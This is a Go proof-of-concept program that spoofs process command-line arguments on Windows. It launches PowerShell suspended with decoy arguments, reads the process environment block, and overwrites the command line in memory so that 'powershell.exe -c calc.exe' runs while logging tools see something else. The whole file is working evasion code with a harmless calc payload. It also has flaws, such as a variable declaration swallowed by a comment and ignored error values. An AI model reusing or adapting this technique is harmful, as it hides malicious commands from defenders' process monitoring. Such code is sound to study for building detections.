package main
//https://www.php.cn/faq/516361.html


import (
	"fmt"
	"syscall"
	"unsafe"
	"golang.org/x/sys/windows"
)

// Constants for process creation
const (
	STARTUP_ARGS             = "powershell.exe Totally Legit Argument"
	REAL_EXECUTED_ARGS       = "powershell.exe -c calc.exe"
	ProcessBasicInformation  = 0
)

// Structure definitions

// UNICODE_STRING represents a UTF-16 encoded string in Windows
type UNICODE_STRING struct {
	Length        uint16
	MaximumLength uint16
	Buffer        *uint16
}

// RTL_USER_PROCESS_PARAMETERS represents process parameters including command line
type RTL_USER_PROCESS_PARAMETERS struct {
	Reserved1     [16]byte          // Reserved byte array
	Reserved2     [10]unsafe.Pointer // Array of generic pointers
	ImagePathName UNICODE_STRING     // Path to the process image
	CommandLine   UNICODE_STRING     // Command line used to start the process
}

// Define RTL_CRITICAL_SECTION_DEBUG struct as an empty struct for demonstration purposes
// since details of this struct are typically not needed unless debugging.
type RTL_CRITICAL_SECTION_DEBUG struct {
	// Actual structure fields omitted for simplicity.
}

// Define RTL_CRITICAL_SECTION struct
type RTL_CRITICAL_SECTION struct {
	DebugInfo      *RTL_CRITICAL_SECTION_DEBUG // Pointer to debugging information
	LockCount      int32                       // Lock count
	RecursionCount int32                       // Recursion count
	OwningThread   unsafe.Pointer              // Pointer to the owning thread (PVOID in C)
	LockSemaphore  unsafe.Pointer              // Semaphore used in the lock (PVOID in C)
	SpinCount      uint32                      // Spin count (ULONG in C)
}

// Aliases for pointers to the structure, maintaining naming consistency
type PRTL_CRITICAL_SECTION = *RTL_CRITICAL_SECTION
type PRTL_CRITICAL_SECTION_DEBUG = *RTL_CRITICAL_SECTION_DEBUG


// PROCESS_BASIC_INFORMATION holds information about a process
type PROCESS_BASIC_INFORMATION struct {
	Reserved1       uintptr
	PebBaseAddress  uintptr
	Reserved2       [2]uintptr
	UniqueProcessID uintptr
	Reserved3       uintptr
}

// LIST_ENTRY is a doubly linked list structure in Windows
type LIST_ENTRY struct {
	Flink *LIST_ENTRY // Forward link pointer
	Blink *LIST_ENTRY // Backward link pointer
}

// Aliases for consistency with C-style typedefs
type PLIST_ENTRY = *LIST_ENTRY
type PRLIST_ENTRY = *LIST_ENTRY

// PEB_LDR_DATA holds module load information
type PEB_LDR_DATA struct{
	Length			uint32
	Initialized		bool
	SsHandle		syscall.Handle
	InLoadOrderModuleList		LIST_ENTRY
	InMemoryOrderModuleList		LIST_ENTRY
	InInitializationOrderModuleList		LIST_ENTRY
}

// PEB (Process Environment Block) contains process environment information
type PEB struct {
	InheritedAddressSpace	bool
	ReadImageFileExecOptions	bool
	BeingDebugged			bool
	SpareBool				bool
	Mutant					syscall.Handle
	ImageBaseAddress		uintptr
	Ldr						*PEB_LDR_DATA
	ProcessParameters		*RTL_USER_PROCESS_PARAMETERS
	SubSystemData			uintptr
	ProcessHeap				uintptr
	FastPebLock				*RTL_CRITICAL_SECTION
	AtlThunkSListPtr		uintptr
	IFEOKey					uintptr
	CrossProcessFlags		uintptr
	UserSharedInfoPtr		uintptr
	SystemReserved			[1]uint32
	AtlThunkSlistPtr32		uintptr
	ApiSetMap				uintptr
}



// GetProcessParameters retrieves a pointer to process parameters
func (p *PEB) GetProcessParameters() uintptr {
	return uintptr(unsafe.Pointer(p.ProcessParameters))
}



// readUnicodeString reads a UNICODE_STRING from the target process memory
func readUnicodeString(hProcess windows.Handle, us UNICODE_STRING) string {
	// Allocate a buffer to hold the UTF-16 encoded string
	buf := make([]uint16, us.Length/2)
	err := windows.ReadProcessMemory(hProcess, uintptr(unsafe.Pointer(us.Buffer)), (*byte)(unsafe.Pointer(&buf[0])), uintptr(us.Length), nil)
	if err != nil {
		fmt.Errorf("could not read UNICODE_STRING: %v", err)
	}
	return windows.UTF16ToString(buf)
}

// CreateArgSpoofedProcess creates a process with spoofed command-line arguments
func CreateArgSpoofedProcess(fakeArgs, realArgs string) (windows.Handle, windows.Handle, uint32, error) {
	var si windows.StartupInfo
	var pi windows.ProcessInformation

	// Step 1: Create a process in a suspended state with fake arguments
	err := windows.CreateProcess(nil, syscall.StringToUTF16Ptr(fakeArgs), nil, nil, false, windows.CREATE_SUSPENDED, nil, nil, &si, &pi)
	if err != nil {
		return 0, 0, 0, fmt.Errorf("CreateProcess failed: %v", err)
	}


	
	// Step 2: Retrieve the Process Environment Block (PEB) address	var pbi PROCESS_BASIC_INFORMATION 
	var returnLength uint32


	ntdll := syscall.NewLazyDLL("ntdll.dll")
	procNtQueryInformationProcess := ntdll.NewProc("NtQueryInformationProcess")
	_, _, err = procNtQueryInformationProcess.Call(
		uintptr(pi.Process),
		uintptr(ProcessBasicInformation),
		uintptr(unsafe.Pointer(&pbi)),
		unsafe.Sizeof(pbi),
		uintptr(unsafe.Pointer(&returnLength)),
	)
	if err != nil && err.Error() != "The operation completed successfully." {
		fmt.Printf("NtQueryInformationProcess failed: %v\n", err)
		return 0, 0, 0, err
	}
	fmt.Printf("%h", pbi.PebBaseAddress)


	// Step 3: Read the PEB from target process memory
	var peb PEB
	err = windows.ReadProcessMemory(pi.Process, pbi.PebBaseAddress, (*byte)(unsafe.Pointer(&peb)), unsafe.Sizeof(peb), nil)	
	if err != nil {
		return 0, 0, 0, err
	}

	// Step 4: Read the RTL_USER_PROCESS_PARAMETERS structure	
	var processParameters RTL_USER_PROCESS_PARAMETERS
	err = windows.ReadProcessMemory(pi.Process, peb.GetProcessParameters(), (*byte)(unsafe.Pointer(&processParameters)), unsafe.Sizeof(processParameters), nil)
	if err != nil {
			return 0, 0, 0, err
	}

	commandLine := readUnicodeString(pi.Process, processParameters.CommandLine)
	fmt.Printf("CommandLine: %s\n", commandLine)
	fmt.Printf("PEB Stored at: 0x%X\n", pbi.PebBaseAddress)
	fmt.Printf("CommandLine Stored at: 0x%X\n", uintptr(unsafe.Pointer(peb.ProcessParameters)))

	
	// Step 5: Convert real command line to UTF-16 and replace in target memory
	utf16CmdLine, err := syscall.UTF16FromString(REAL_EXECUTED_ARGS)
	if err != nil {
		fmt.Errorf("failed to convert command line to UTF-16: %v", err)
		return 0, 0, 0, err
	}

	newCmdLineBytes := len(utf16CmdLine) * 2 // Calculate byte size of UTF-16 encoded command line

	// Overwrite the command line buffer in target process memory
	var bytesWritten uintptr
	err = windows.WriteProcessMemory(pi.Process, uintptr(unsafe.Pointer(processParameters.CommandLine.Buffer)), (*byte)(unsafe.Pointer(&utf16CmdLine[0])), uintptr(newCmdLineBytes), &bytesWritten)
	if err != nil {
		return 0,0,0, err
	}
	fmt.Println(bytesWritten)


	// Step 6: Update the length of the command line
	lengthFieldAddress := uintptr(unsafe.Pointer(peb.ProcessParameters)) + unsafe.Offsetof(processParameters.CommandLine) + unsafe.Offsetof(processParameters.CommandLine.Length)
	utf16ProcessLine, err := syscall.UTF16FromString("powershell.exe")
	newCmdLineLength := uint16(len(utf16ProcessLine)*2)
	err = windows.WriteProcessMemory(pi.Process, lengthFieldAddress, (*byte)(unsafe.Pointer(&newCmdLineLength)), unsafe.Sizeof(newCmdLineLength), nil)
	if err != nil {
		return 0, 0, 0, err
	}



	commandLine = readUnicodeString(pi.Process, processParameters.CommandLine)
	fmt.Printf("Overwritten CommandLine: %s\n", commandLine)




	fmt.Scanln()

	// Resume the suspended process with the new command line
	windows.ResumeThread(pi.Thread)

	fmt.Printf("Spoofed process created with PID: %d\n", pi.ProcessId)
	return pi.Process, pi.Thread, pi.ProcessId, nil
}

func main() {
	// Start the spoofed process with modified arguments
	hProcess, hThread, pid, err := CreateArgSpoofedProcess(STARTUP_ARGS, STARTUP_ARGS)
	if err != nil {
		fmt.Printf("Failed to create spoofed process: %v\n", err)
		return
	}

	defer windows.CloseHandle(hProcess)
	defer windows.CloseHandle(hThread)

	fmt.Printf("Process created with PID: %d\n", pid)
}
